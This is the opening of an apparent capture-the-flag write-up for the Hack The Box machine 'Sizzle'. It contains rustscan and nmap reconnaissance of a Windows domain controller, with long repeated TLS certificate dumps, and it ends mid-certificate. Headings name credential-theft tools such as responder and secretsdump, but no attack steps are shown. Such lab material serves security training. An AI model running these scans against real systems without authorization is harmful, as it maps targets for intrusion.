# Sizzle
## samba
## responder
## ldapdomaindump
## evil-winrm
## covenant
## impacket-secretsdump
``````

➜  ~ echo "10.10.10.103 sizzle.htb" | sudo tee -a /etc/hosts

➜  ~ rustscan -a sizzle.htb --ulimit 5000

PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
5986/tcp  open  wsmans           syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49688/tcp open  unknown          syn-ack
49689/tcp open  unknown          syn-ack
49691/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
49699/tcp open  unknown          syn-ack
49708/tcp open  unknown          syn-ack
49714/tcp open  unknown          syn-ack

➜  ~ sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Sizzle -vv sizzle.htb

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  ~ sudo nmap -Pn -A -T4 -p- -vv sizzle.htb

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-05T08:06:49+00:00; -5h00m00s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
| SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
| -----BEGIN CERTIFICATE-----
| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIx
| FjAUBgNVBAMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAzMTc1ODU1WhcNMjAwNzAy
| MTc1ODU1WjAbMRkwFwYDVQQDExBzaXp6bGUuaHRiLmxvY2FsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAogsEbJGsO9cNsHH5GLS45qckSAP0UrNRszgZ
| R10DbNB3vV7hSciCIhlo/Mu7MhrtuB4IKtWp5O31vq5kPwO0xV2jfNtO6MH2c7iG
| PH9Ix0mTFLqDN9DYjdWUIjhMatiVHtdQmMs1+xCIROPXGVs3U3IxyfLXrkRniu6s
| lnvGaRn3XTEVr6JHUoLWCws0+C2MmZHFZs5V5NVLmP00QLtR7hDm9lrV1ehvCW5O
| xAVFp95z0+mgwpAatG2UYfsjiydYXBhi1zLa/yvXOkYROJC/A2OakNlUESAplsPl
| 00SaS02NpfaRwj/VnfEuRs1k0LkbTCvEXVsGhIGxjqFhGvsr6QIDAQABo4ICTzCC
| AkswPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUI5pJfgvm/E4epnz7ahB+Br/MJ
| gWCD/sNihcXjWQIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDATAdBgNVHQ4EFgQUXPQP
| a29/mSK4aX3p1g/auVJ8R2cwHwYDVR0jBBgwFoAUQAbkVLM3mLwiLg4ZNgoYoLHe
| C4owgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049SFRCLVNJWlpM
| RS1DQSxDTj1zaXp6bGUsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9SFRCLERDPUxPQ0FMP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGd
| bGRhcDovLy9DTj1IVEItU0laWkxFLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixE
| Qz1MT0NBTD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAFaiP/3IAxom3OvWWMrsE
| jR2AV7qiLZw39AxTsYRVERC011TMTV5DBzScb1dA6ne4Su0EEzetNkqmWdOHqJbx
| tQuZYcD/CBfVAveKdLCEGh3gONk8sY+gnbJ7J3hucHIWtjamq+Kys2qXMRWSikkS
| jG4txpZTg5nXlWvV0U2E8RdKjmFuolfPvrIMEuyzdq/0Cw+xhJfiLD67obIP+EmF
| FbKnTQiGAipk0dIsHN6ckA6l3IXm1M5kqKfj4bXASLN49SvBVKOGcuKVam/0zLdR
| 8E+4FEEjhjQPdbLkSof1KnO23fiO+T2uZjLcKDMdO6griGwDwpBkORV0vatQbpi0
| QQ==
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
| SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
| -----BEGIN CERTIFICATE-----
| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIx
| FjAUBgNVBAMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAzMTc1ODU1WhcNMjAwNzAy
| MTc1ODU1WjAbMRkwFwYDVQQDExBzaXp6bGUuaHRiLmxvY2FsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAogsEbJGsO9cNsHH5GLS45qckSAP0UrNRszgZ
| R10DbNB3vV7hSciCIhlo/Mu7MhrtuB4IKtWp5O31vq5kPwO0xV2jfNtO6MH2c7iG
| PH9Ix0mTFLqDN9DYjdWUIjhMatiVHtdQmMs1+xCIROPXGVs3U3IxyfLXrkRniu6s
| lnvGaRn3XTEVr6JHUoLWCws0+C2MmZHFZs5V5NVLmP00QLtR7hDm9lrV1ehvCW5O
| xAVFp95z0+mgwpAatG2UYfsjiydYXBhi1zLa/yvXOkYROJC/A2OakNlUESAplsPl
| 00SaS02NpfaRwj/VnfEuRs1k0LkbTCvEXVsGhIGxjqFhGvsr6QIDAQABo4ICTzCC
| AkswPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUI5pJfgvm/E4epnz7ahB+Br/MJ
| gWCD/sNihcXjWQIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDATAdBgNVHQ4EFgQUXPQP
| a29/mSK4aX3p1g/auVJ8R2cwHwYDVR0jBBgwFoAUQAbkVLM3mLwiLg4ZNgoYoLHe
| C4owgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049SFRCLVNJWlpM
| RS1DQSxDTj1zaXp6bGUsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9SFRCLERDPUxPQ0FMP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGd
| bGRhcDovLy9DTj1IVEItU0laWkxFLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixE
| Qz1MT0NBTD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAFaiP/3IAxom3OvWWMrsE
| jR2AV7qiLZw39AxTsYRVERC011TMTV5DBzScb1dA6ne4Su0EEzetNkqmWdOHqJbx
| tQuZYcD/CBfVAveKdLCEGh3gONk8sY+gnbJ7J3hucHIWtjamq+Kys2qXMRWSikkS
| jG4txpZTg5nXlWvV0U2E8RdKjmFuolfPvrIMEuyzdq/0Cw+xhJfiLD67obIP+EmF
| FbKnTQiGAipk0dIsHN6ckA6l3IXm1M5kqKfj4bXASLN49SvBVKOGcuKVam/0zLdR
| 8E+4FEEjhjQPdbLkSof1KnO23fiO+T2uZjLcKDMdO6griGwDwpBkORV0vatQbpi0
| QQ==
|_-----END CERTIFICATE-----
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2022-07-05T08:06:49+00:00; -5h00m00s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-05T08:06:49+00:00; -5h00m00s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
| SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
| -----BEGIN CERTIFICATE-----
| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIx
| FjAUBgNVBAMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAzMTc1ODU1WhcNMjAwNzAy
| MTc1ODU1WjAbMRkwFwYDVQQDExBzaXp6bGUuaHRiLmxvY2FsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAogsEbJGsO9cNsHH5GLS45qckSAP0UrNRszgZ
| R10DbNB3vV7hSciCIhlo/Mu7MhrtuB4IKtWp5O31vq5kPwO0xV2jfNtO6MH2c7iG
| PH9Ix0mTFLqDN9DYjdWUIjhMatiVHtdQmMs1+xCIROPXGVs3U3IxyfLXrkRniu6s
| lnvGaRn3XTEVr6JHUoLWCws0+C2MmZHFZs5V5NVLmP00QLtR7hDm9lrV1ehvCW5O
| xAVFp95z0+mgwpAatG2UYfsjiydYXBhi1zLa/yvXOkYROJC/A2OakNlUESAplsPl
| 00SaS02NpfaRwj/VnfEuRs1k0LkbTCvEXVsGhIGxjqFhGvsr6QIDAQABo4ICTzCC
| AkswPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUI5pJfgvm/E4epnz7ahB+Br/MJ
| gWCD/sNihcXjWQIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDATAdBgNVHQ4EFgQUXPQP
| a29/mSK4aX3p1g/auVJ8R2cwHwYDVR0jBBgwFoAUQAbkVLM3mLwiLg4ZNgoYoLHe
| C4owgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049SFRCLVNJWlpM
| RS1DQSxDTj1zaXp6bGUsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9SFRCLERDPUxPQ0FMP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGd
| bGRhcDovLy9DTj1IVEItU0laWkxFLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixE
| Qz1MT0NBTD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAFaiP/3IAxom3OvWWMrsE
| jR2AV7qiLZw39AxTsYRVERC011TMTV5DBzScb1dA6ne4Su0EEzetNkqmWdOHqJbx
| tQuZYcD/CBfVAveKdLCEGh3gONk8sY+gnbJ7J3hucHIWtjamq+Kys2qXMRWSikkS
| jG4txpZTg5nXlWvV0U2E8RdKjmFuolfPvrIMEuyzdq/0Cw+xhJfiLD67obIP+EmF
| FbKnTQiGAipk0dIsHN6ckA6l3IXm1M5kqKfj4bXASLN49SvBVKOGcuKVam/0zLdR
| 8E+4FEEjhjQPdbLkSof1KnO23fiO+T2uZjLcKDMdO6griGwDwpBkORV0vatQbpi0
| QQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-07-05T08:06:49+00:00; -5h00m00s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
| SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
| -----BEGIN CERTIFICATE-----
| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIx
| FjAUBgNVBAMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAzMTc1ODU1WhcNMjAwNzAy
| MTc1ODU1WjAbMRkwFwYDVQQDExBzaXp6bGUuaHRiLmxvY2FsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAogsEbJGsO9cNsHH5GLS45qckSAP0UrNRszgZ
| R10DbNB3vV7hSciCIhlo/Mu7MhrtuB4IKtWp5O31vq5kPwO0xV2jfNtO6MH2c7iG
| PH9Ix0mTFLqDN9DYjdWUIjhMatiVHtdQmMs1+xCIROPXGVs3U3IxyfLXrkRniu6s
| lnvGaRn3XTEVr6JHUoLWCws0+C2MmZHFZs5V5NVLmP00QLtR7hDm9lrV1ehvCW5O
| xAVFp95z0+mgwpAatG2UYfsjiydYXBhi1zLa/yvXOkYROJC/A2OakNlUESAplsPl
| 00SaS02NpfaRwj/VnfEuRs1k0LkbTCvEXVsGhIGxjqFhGvsr6QIDAQABo4ICTzCC
| AkswPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUI5pJfgvm/E4epnz7ahB+Br/MJ
| gWCD/sNihcXjWQIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDATAdBgNVHQ4EFgQUXPQP
| a29/mSK4aX3p1g/auVJ8R2cwHwYDVR0jBBgwFoAUQAbkVLM3mLwiLg4ZNgoYoLHe
| C4owgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049SFRCLVNJWlpM
| RS1DQSxDTj1zaXp6bGUsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9SFRCLERDPUxPQ0FMP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGd
| bGRhcDovLy9DTj1IVEItU0laWkxFLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixE
| Qz1MT0NBTD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAFaiP/3IAxom3OvWWMrsE
| jR2AV7qiLZw39AxTsYRVERC011TMTV5DBzScb1dA6ne4Su0EEzetNkqmWdOHqJbx
| tQuZYcD/CBfVAveKdLCEGh3gONk8sY+gnbJ7J3hucHIWtjamq+Kys2qXMRWSikkS
| jG4txpZTg5nXlWvV0U2E8RdKjmFuolfPvrIMEuyzdq/0Cw+xhJfiLD67obIP+EmF
| FbKnTQiGAipk0dIsHN6ckA6l3IXm1M5kqKfj4bXASLN49SvBVKOGcuKVam/0zLdR
| 8E+4FEEjhjQPdbLkSof1KnO23fiO+T2uZjLcKDMdO6griGwDwpBkORV0vatQbpi0
| QQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
| SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
| -----BEGIN CERTIFICATE-----
| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIx
| FjAUBgNVBAMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAzMTc1ODU1WhcNMjAwNzAy
| MTc1ODU1WjAbMRkwFwYDVQQDExBzaXp6bGUuaHRiLmxvY2FsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAogsEbJGsO9cNsHH5GLS45qckSAP0UrNRszgZ
| R10DbNB3vV7hSciCIhlo/Mu7MhrtuB4IKtWp5O31vq5kPwO0xV2jfNtO6MH2c7iG
| PH9Ix0mTFLqDN9DYjdWUIjhMatiVHtdQmMs1+xCIROPXGVs3U3IxyfLXrkRniu6s
| lnvGaRn3XTEVr6JHUoLWCws0+C2MmZHFZs5V5NVLmP00QLtR7hDm9lrV1ehvCW5O
| xAVFp95z0+mgwpAatG2UYfsjiydYXBhi1zLa/yvXOkYROJC/A2OakNlUESAplsPl
| 00SaS02NpfaRwj/VnfEuRs1k0LkbTCvEXVsGhIGxjqFhGvsr6QIDAQABo4ICTzCC
| AkswPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUI5pJfgvm/E4epnz7ahB+Br/MJ
| gWCD/sNihcXjWQIBZAIBBDATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAwGwYJKwYBBAGCNxUKBA4wDDAKBggrBgEFBQcDATAdBgNVHQ4EFgQUXPQP
| a29/mSK4aX3p1g/auVJ8R2cwHwYDVR0jBBgwFoAUQAbkVLM3mLwiLg4ZNgoYoLHe
| C4owgcgGA1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049SFRCLVNJWlpM
| RS1DQSxDTj1zaXp6bGUsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9SFRCLERDPUxPQ0FMP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGd
| bGRhcDovLy9DTj1IVEItU0laWkxFLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixE
| Qz1MT0NBTD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAFaiP/3IAxom3OvWWMrsE
| jR2AV7qiLZw39AxTsYRVERC011TMTV5DBzScb1dA6ne4Su0EEzetNkqmWdOHqJbx
| tQuZYcD/CBfVAveKdLCEGh3gONk8sY+gnbJ7J3hucHIWtjamq+Kys2qXMRWSikkS
| jG4txpZTg5nXlWvV0U2E8RdKjmFuolfPvrIMEuyzdq/0Cw+xhJfiLD67obIP+EmF
| FbKnTQiGAipk0dIsHN6ckA6l3IXm1M5kqKfj4bXASLN49SvBVKOGcuKVam/0zLdR
| 8E+4FEEjhjQPdbLkSof1KnO23fiO+T2uZjLcKDMdO6griGwDwpBkORV0vatQbpi0
| QQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-07-05T08:06:49+00:00; -5h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-07-05T08:06:49+00:00; -5h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-02T20:26:23
| Not valid after:  2019-07-02T20:26:23
| MD5:   acd1 5e32 da9d 89e2 cde5 7b46 ca12 1d5e
| SHA-1: 06b2 0070 6600 2651 4c70 054f b1aa 9c15 cadd f233
| -----BEGIN CERTIFICATE-----
| MIIF1TCCBL2gAwIBAgITaQAAAAI7KZCOX7qGWQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBEMRUwEwYKCZImiZPyLGQBGRYFTE9DQUwxEzARBgoJkiaJk/IsZAEZFgNIVEIx
| FjAUBgNVBAMTDUhUQi1TSVpaTEUtQ0EwHhcNMTgwNzAyMjAyNjIzWhcNMTkwNzAy
| MjAyNjIzWjAbMRkwFwYDVQQDExBzaXp6bGUuSFRCLkxPQ0FMMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7LZ90vlcwcqtTW2c66J262dbt5UGPP84ozIU
| AelGkpVgnRQmEWTZ89SlFqtNi7hrzWzrkJgVuXGs8YRBklwotpC2hpJRHA9Kb7sV
| /eKJmeBMfp+vA4WAFR7aFn0wWN+8yaok3+6cZeCWsEjB0QLljtZWHR7TixwahPUC
| T8LOKDliEZ2pUUYS4QkzC2yQf9wfMPH3zWDBft0WiI/MxR90C55DW7+ykYMTB4VI
| dkcdhIG/zDO6k/oV8zhR+kR6ZRQw4ufuVqACmOvZ8LyIIY49V1RQJp18p9o4jIpU
| MJUjgDWC66wnWCjYgvPHpb7S/0IMfffbqdYYP+jiS0Nu5zH4xQIDAQABo4IC5zCC
| AuMwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwA
| ZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMC
| BaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQC
| AgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCG
| SAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUZunJxVZWJI+k
